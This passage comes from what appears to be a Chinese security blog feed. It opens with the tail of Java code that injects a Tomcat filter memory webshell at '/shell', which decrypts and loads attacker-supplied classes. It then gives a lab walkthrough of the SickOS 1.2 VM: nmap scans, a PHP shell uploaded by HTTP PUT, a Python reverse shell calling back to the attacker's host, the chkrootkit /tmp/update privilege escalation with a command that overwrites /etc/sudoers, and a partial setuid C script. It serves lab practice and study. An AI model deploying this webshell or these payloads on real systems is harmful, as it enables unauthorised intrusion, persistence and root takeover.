punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Object</span> u <span class="token operator">=</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Method</span> <span class="token class-name">Um</span> <span class="token operator">=</span> uclass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"g"</span><span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Um</span><span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> k <span class="token operator">=</span> <span class="token string">"3ad2fddfe8bad8e6"</span><span class="token punctuation">;</span>            session<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"u"</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Cipher</span> c <span class="token operator">=</span> <span class="token class-name">Cipher</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"AES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            c<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">SecretKeySpec</span><span class="token punctuation">(</span>k<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"AES"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> eClassBytes <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">doFinal</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BASE64Decoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decodeBuffer</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Class</span> eclass <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span><span class="token class-name">Um</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>u<span class="token punctuation">,</span> eClassBytes<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Object</span> a <span class="token operator">=</span> eclass<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Method</span> b <span class="token operator">=</span> eclass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"equals"</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            b<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            b<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> pageContext<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var19<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> name <span class="token operator">=</span> <span class="token string">"AutomneGreet"</span><span class="token punctuation">;</span>            <span class="token class-name">WebappClassLoaderBase</span> webappClassLoaderBase <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">WebappClassLoaderBase</span><span class="token punctuation">)</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">StandardContext</span> standardContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardContext</span><span class="token punctuation">)</span>webappClassLoaderBase<span class="token punctuation">.</span><span class="token function">getResources</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Field</span> <span class="token class-name">Configs</span> <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.apache.catalina.core.StandardContext"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"filterConfigs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Configs</span><span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Map</span> filterConfigs <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">)</span><span class="token class-name">Configs</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>standardContext<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>filterConfigs<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"AutomneGreet"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">Filter</span> filter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">IceShell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">FilterDef</span> filterDef <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilterDef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                filterDef<span class="token punctuation">.</span><span class="token function">setFilter</span><span class="token punctuation">(</span>filter<span class="token punctuation">)</span><span class="token punctuation">;</span>                filterDef<span class="token punctuation">.</span><span class="token function">setFilterName</span><span class="token punctuation">(</span><span class="token string">"AutomneGreet"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                filterDef<span class="token punctuation">.</span><span class="token function">setFilterClass</span><span class="token punctuation">(</span>filter<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                standardContext<span class="token punctuation">.</span><span class="token function">addFilterDef</span><span class="token punctuation">(</span>filterDef<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">FilterMap</span> filterMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilterMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                filterMap<span class="token punctuation">.</span><span class="token function">addURLPattern</span><span class="token punctuation">(</span><span class="token string">"/shell"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                filterMap<span class="token punctuation">.</span><span class="token function">setFilterName</span><span class="token punctuation">(</span><span class="token string">"AutomneGreet"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                filterMap<span class="token punctuation">.</span><span class="token function">setDispatcher</span><span class="token punctuation">(</span><span class="token class-name">DispatcherType</span><span class="token punctuation">.</span><span class="token constant">REQUEST</span><span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                standardContext<span class="token punctuation">.</span><span class="token function">addFilterMapBefore</span><span class="token punctuation">(</span>filterMap<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> <span class="token class-name">ApplicationFilterConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">FilterDef</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">ApplicationFilterConfig</span> filterConfig <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ApplicationFilterConfig</span><span class="token punctuation">)</span>constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>standardContext<span class="token punctuation">,</span> filterDef<span class="token punctuation">)</span><span class="token punctuation">;</span>                filterConfigs<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"AutomneGreet"</span><span class="token punctuation">,</span> filterConfig<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var10<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="漏洞复现" scheme="http://3143047748.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="java" scheme="http://3143047748.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Sickos-1.2</title>
    <link href="http://3143047748.github.io/2024/03/18/Sickos-1-2/"/>
    <id>http://3143047748.github.io/2024/03/18/Sickos-1-2/</id>
    <published>2024-03-18T13:18:18.000Z</published>
    <updated>2024-06-19T13:48:47.348Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/><h2 id="发现主机"><a href="#发现主机" class="headerlink" title="发现主机"></a>发现主机</h2><blockquote><p>nmap 192.168.206.138&#x2F;24</p></blockquote><p>发现主机192.168.206.157</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><blockquote><p>nmap 192.168.206.157 -p- -A -sS</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.206.157Host is up <span class="token punctuation">(</span><span class="token number">0</span>.0011s latency<span class="token punctuation">)</span>.Not shown: <span class="token number">65533</span> filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>PORT   STATE SERVICE VERSION<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">5</span>.9p1 Debian 5ubuntu1.8 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span><span class="token operator">|</span> ssh-hostkey: <span class="token operator">|</span>   <span class="token number">1024</span> <span class="token number">66</span>:8c:c0:f2:85:7c:6c:c0:f6:ab:7d:48:04:81:c2:d4 <span class="token punctuation">(</span>DSA<span class="token punctuation">)</span><span class="token operator">|</span>   <span class="token number">2048</span> ba:86:f5:ee:cc:83:df:a6:3f:fd:c1:34:bb:7e:62:ab <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span><span class="token operator">|</span>_  <span class="token number">256</span> a1:6c:fa:18:da:57:1d:33:2c:52:e4:ec:97:e2:9e:af <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span><span class="token number">80</span>/tcp <span class="token function">open</span>  http    lighttpd <span class="token number">1.4</span>.28<span class="token operator">|</span>_http-title: Site doesn't have a title <span class="token punctuation">(</span>text/html<span class="token punctuation">)</span>.<span class="token operator">|</span>_http-server-header: lighttpd/1.4.28MAC Address: 00:0C:29:0B:25:C7 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>Warning: OSScan results may be unreliable because we could not <span class="token function">find</span> at least <span class="token number">1</span> <span class="token function">open</span> and <span class="token number">1</span> closed portDevice type: general purposeRunning: Linux <span class="token number">3</span>.X<span class="token operator">|</span><span class="token number">4</span>.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux <span class="token number">3.10</span> - <span class="token number">4.11</span>, Linux <span class="token number">3.16</span> - <span class="token number">4.6</span>, Linux <span class="token number">3.2</span> - <span class="token number">4.9</span>, Linux <span class="token number">4.4</span>Network Distance: <span class="token number">1</span> hopService Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT     ADDRESS<span class="token number">1</span>   <span class="token number">1.09</span> ms <span class="token number">192.168</span>.206.157OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">117.00</span> seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从上面可以看到使用了web服务器lighttpd&#x2F;1.4.28，开放了22和80端口，尝试搜索lighttpd&#x2F;1.4.28是否存在漏洞<br><img src="https://img-blog.csdnimg.cn/direct/4fb3bdb0befc46b1a6eb89cf31b44619.png" alt="132"><br>尝试mod_userdir Information Disclosure发现也不可以</p><p>扫描期间先看看http服务，查看源代码没有任何发现，扫一下目录</p><blockquote><p>dirsearch -u <a href="http://192.168.206.157/">http://192.168.206.157/</a></p></blockquote><p>扫描结果：<br><img src="https://img-blog.csdnimg.cn/direct/e04aee37b3064b23ada3bf552163d9b7.png" alt="lighttpd/1.4.28"><br>发现存在一个目录test，访问看看目录下无文件<br><img src="https://img-blog.csdnimg.cn/direct/620462a816814f1ab3b0e1bfe8f185f3.png" alt="123"></p><p>既然无文件那么能够上传文件吗</p><h2 id="上传木马"><a href="#上传木马" class="headerlink" title="上传木马"></a>上传木马</h2><p>这是重要的一步，自己做的时候没有往这方面想。<br>那么该如何知道是否可以上传文件呢？<br>查看&#x2F;test目录支持的方法</p><blockquote><p><code>nmap --script http-methods --script-args http-methods.url-path=&#39;/test&#39; 192.168.206.157</code><br><img src="https://img-blog.csdnimg.cn/direct/a494d6fdf7a54f3390350e5e975b771e.png" alt="123"></p></blockquote><p>burp抓包发送OPTIONS请求：<br><img src="https://img-blog.csdnimg.cn/direct/3bbc61a3d87c49b698b35495dc301085.png" alt="123"></p><p>curl发送OPTIONS请求：</p><blockquote><p><code>curl  -v -X OPTIONS http://192.168.206.157/test/</code><br><img src="https://img-blog.csdnimg.cn/direct/68d04e5de38346b6a0d9a96d6723bcb5.png" alt="123"></p></blockquote><p>以上方法都可以查看接受的请求方法。接受PUT方法就是我们可以以PUT方法写入文件。尝试一下：</p><blockquote><p><code>curl -v -X PUT -d &quot;&lt;?php phpinfo();?&gt;&quot; http://192.168.206.157/test/shell.php</code></p></blockquote><p>发现已经成功写入文件，那么开始写入一句话木马，或者直接传入php反弹shell的文件。<br><img src="https://img-blog.csdnimg.cn/direct/2f5bbf15aa8749ba9633546cf7d45bb3.png" alt="132"></p><p>使用蚁剑连接靶机，目前权限为www-data。收集信息进行提权。</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>上传linux信息收集脚本：<br>运行收集信息时文件不好看，尝试先反弹那一个shell，再进行信息收集。再创建一个反弹shell文件，尝试了几个脚本发现都不行，最后找到这个脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token punctuation">,</span>subprocess<span class="token punctuation">,</span>oss<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"192.168.206.138"</span><span class="token punctuation">,</span><span class="token number">443</span><span class="token punctuation">)</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>p<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-i"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>kali监听端口，蚁剑上运行命令<code>python python.py</code>，得到一个伪终端。<br><img src="https://img-blog.csdnimg.cn/direct/6164c2511cf0498c81a4cdc22e487081.png" alt="123"><br>执行文件linpeas.sh，似乎没有发现什么</p><h2 id="计划任务提权"><a href="#计划任务提权" class="headerlink" title="计划任务提权"></a>计划任务提权</h2><p>这又是重要一步，想不到哇。。。<br>列出与定时任务相关的文件和目录</p><blockquote><p>www-data@ubuntu:&#x2F;var&#x2F;www&#x2F;test$ ls -al &#x2F;etc&#x2F;cron*<br><img src="https://img-blog.csdnimg.cn/direct/e415f1d44e6b464c98277d27cc5e1785.png" alt="123"></p></blockquote><h3 id="chkrootkit"><a href="#chkrootkit" class="headerlink" title="chkrootkit"></a>chkrootkit</h3><p>chkrootkit version 0.49存在本地提权漏洞<br><img src="https://img-blog.csdnimg.cn/direct/3b36f2fb4224479984a15cb5ba363c6b.png" alt="123"></p><blockquote><p>漏洞原理:chkrootkit有crontab，会定期以root身份执行&#x2F;tmp&#x2F;update文件。如果攻击者知道管理员是定期运行chkrootkit(通过查看cron.daily获知)，并且对&#x2F; tmp(没有挂载noexec)有写访问权限，就可以利用该漏洞获取root权限。</p></blockquote><pre class="line-numbers language-text" data-language="text"><code class="language-text">We just found a serious vulnerability in the chkrootkit package, whichmay allow local attackers to gain root access to a box in certainconfigurations (/tmp not mounted noexec).The vulnerability is located in the function slapper() in theshellscript chkrootkit:## SLAPPER.&#123;A,B,C,D&#125; and the multi-platform variant#slapper ()&#123;   SLAPPER_FILES="$&#123;ROOTDIR&#125;tmp/.bugtraq $&#123;ROOTDIR&#125;tmp/.bugtraq.c"   SLAPPER_FILES="$SLAPPER_FILES $&#123;ROOTDIR&#125;tmp/.unlock $&#123;ROOTDIR&#125;tmp/httpd \   $&#123;ROOTDIR&#125;tmp/update $&#123;ROOTDIR&#125;tmp/.cinik $&#123;ROOTDIR&#125;tmp/.b"a   SLAPPER_PORT="0.0:2002 |0.0:4156 |0.0:1978 |0.0:1812 |0.0:2015 "   OPT=-an   STATUS=0   file_port=   if $&#123;netstat&#125; "$&#123;OPT&#125;"|$&#123;egrep&#125; "^tcp"|$&#123;egrep&#125; "$&#123;SLAPPER_PORT&#125;">/dev/null 2>&amp;1      then      STATUS=1      [ "$SYSTEM" = "Linux" ] &amp;&amp; file_port=`netstat -p $&#123;OPT&#125; | \         $egrep ^tcp|$egrep "$&#123;SLAPPER_PORT&#125;" | $&#123;awk&#125; '&#123; print  $7 &#125;' |tr -d :`   fi   for i in $&#123;SLAPPER_FILES&#125;; do      if [ -f $&#123;i&#125; ]; then         file_port=$file_port $i         STATUS=1      fi   done   if [ $&#123;STATUS&#125; -eq 1 ] ;then      echo "Warning: Possible Slapper Worm installed ($file_port)"   else      if [ "$&#123;QUIET&#125;" != "t" ]; then echo "not infected"; fi         return $&#123;NOT_INFECTED&#125;   fi&#125;The line 'file_port=$file_port $i' will execute all files specified in$SLAPPER_FILES as the user chkrootkit is running (usually root), if$file_port is empty, because of missing quotation marks around thevariable assignment.Steps to reproduce:- Put an executable file named 'update' with non-root owner in /tmp (notmounted noexec, obviously)- Run chkrootkit (as uid 0)Result: The file /tmp/update will be executed as root, thus effectivelyrooting your box, if malicious content is placed inside the file.If an attacker knows you are periodically running chkrootkit (like incron.daily) and has write access to /tmp (not mounted noexec), he mayeasily take advantage of this.Suggested fix: Put quotation marks around the assignment.file_port="$file_port $i"I will also try to contact upstream, although the latest version ofchkrootkit dates back to 2009 - will have to see, if I reach a dev there.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>复制步骤:<br>-在&#x2F;tmp目录下放置一个名为’update’的可执行文件，其所有者不是root<br>挂载noexec，显然)<br>—运行chkrootkit(以uid 0为例)<br>结果:文件&#x2F;tmp&#x2F;update将以root身份执行，因此有效<br>如果恶意内容被放置在文件中，就会在您的盒子中生根。<br>如果攻击者知道您定期运行chkrootkit(如在<br>并且对&#x2F;tmp有写访问权限(没有挂载noexec)，他可以<br>很容易利用这一点。<br>建议修复:在赋值处加上引号。<br>file_port &#x3D; “ file_port我美元”<br>我也会尽量联系上游，虽然最新的版本<br>chkrootkit可以追溯到2009年-如果我在那里找到一个开发人员，我会看到。</p></blockquote><p>在&#x2F;tmp目录下创建文件update，并且赋予权限<br><code>www-data@ubuntu:/tmp$ touch update;chmod +x update</code><br>写入将www-date添加到sudo组的命令</p><blockquote><p><code>echo &#39;chmod +w /etc/sudoers &amp;&amp; echo &quot;www-data ALL=(ALL)  NOPASSWD:ALL&quot; &gt; /etc/sudoers&#39; &gt; /tmp/update</code></p></blockquote><p>喝杯茶的时间再输入命令<code>sudo -l</code><br><img src="https://img-blog.csdnimg.cn/direct/df4a079c1eec4c7da1e42c017053bf4c.png" alt="132"></p><p><img src="https://img-blog.csdnimg.cn/direct/770472af6bb24b639fac9be292d09cd2.png" alt="123"><br>查看一下文件newRule</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Generated by iptables-save v1.4.12 on Mon Apr 25 22:48:24 2016</span>*filter:INPUT DROP <span class="token punctuation">[</span><span class="token number">0</span>:0<span class="token punctuation">]</span>:FORWARD ACCEPT <span class="token punctuation">[</span><span class="token number">0</span>:0<span class="token punctuation">]</span>:OUTPUT DROP <span class="token punctuation">[</span><span class="token number">0</span>:0<span class="token punctuation">]</span><span class="token parameter variable">-A</span> INPUT <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">-m</span> tcp <span class="token parameter variable">--dport</span> <span class="token number">22</span> <span class="token parameter variable">-j</span> ACCEPT<span class="token parameter variable">-A</span> INPUT <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">-m</span> tcp <span class="token parameter variable">--dport</span> <span class="token number">80</span> <span class="token parameter variable">-j</span> ACCEPT<span class="token parameter variable">-A</span> INPUT <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">-m</span> tcp <span class="token parameter variable">--sport</span> <span class="token number">8080</span> <span class="token parameter variable">-j</span> ACCEPT<span class="token parameter variable">-A</span> INPUT <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">-m</span> tcp <span class="token parameter variable">--sport</span> <span class="token number">443</span> <span class="token parameter variable">-j</span> ACCEPT<span class="token parameter variable">-A</span> OUTPUT <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">-m</span> tcp <span class="token parameter variable">--sport</span> <span class="token number">22</span> <span class="token parameter variable">-j</span> ACCEPT<span class="token parameter variable">-A</span> OUTPUT <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">-m</span> tcp <span class="token parameter variable">--sport</span> <span class="token number">80</span> <span class="token parameter variable">-j</span> ACCEPT<span class="token parameter variable">-A</span> OUTPUT <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">-m</span> tcp <span class="token parameter variable">--dport</span> <span class="token number">8080</span> <span class="token parameter variable">-j</span> ACCEPT<span class="token parameter variable">-A</span> OUTPUT <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">-m</span> tcp <span class="token parameter variable">--dport</span> <span class="token number">443</span> <span class="token parameter variable">-j</span> ACCEPTCOMMIT<span class="token comment"># Completed on Mon Apr 25 22:48:24 2016</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>终于知道问什么反弹shell的时候不能使用6666端口了，原来是限定端口了。。。</p><p>还有一个提权的脚本</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//shell.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;unistd.h></span></span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"chown root:root /tmp/update"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"chmod 4755 /tmp/update"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setuid</span><span class="token punctuation">(</span><span 